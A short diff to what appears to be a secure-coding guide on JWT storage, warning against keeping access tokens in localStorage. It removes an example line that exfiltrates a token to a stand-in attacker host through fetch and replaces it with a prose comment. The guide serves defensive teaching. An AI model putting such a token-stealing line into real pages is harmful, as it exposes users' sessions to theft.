@@ -126,8 +126,8 @@ Never trust client-sent roles. Extract the role from the server-verified JWT. Fo
 // ❌ Any XSS payload reads this instantly
 localStorage.setItem('access_token', jwt) // 30-day expiry
 
-// ❌ Every XSS vector now steals the token:
-fetch('https://evil.com?t=' + localStorage.getItem('token'))
+// ❌ Every XSS vector can transmit the token to an external endpoint
+// via fetch(), XMLHttpRequest, or Image beacons
 
 // ❌ "Encrypted" localStorage is security theater
 // The encryption key is also in the JS — extractable
